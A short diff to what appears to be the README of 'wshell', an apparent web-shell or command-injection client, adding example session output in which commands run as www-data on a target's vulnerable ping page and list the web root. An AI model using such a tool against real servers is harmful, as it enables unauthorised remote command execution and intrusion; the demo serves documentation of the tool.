@@ -28,6 +28,15 @@ attacker@host:/$ wshell --log=info 'https://www.target.com/app/vulnerable/ping.p
 
 www-data@app:/var/www/app/vulnerable$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@app:/var/www/app/vulnerable$ cd ../../
+/var/www
+
+www-data@app:/var/www/app/vulnerable$ ls -al
+total 20
+drwxrwx---  8 www-data www-data 4096 Mar  7 23:49 .
+drwxr-xr-x 14 root     root     4096 Mar 18 13:37 ..
+drwxrwx--- 25 www-data www-data 4096 Feb 18 15:31 app
 ```
 
 ## Install
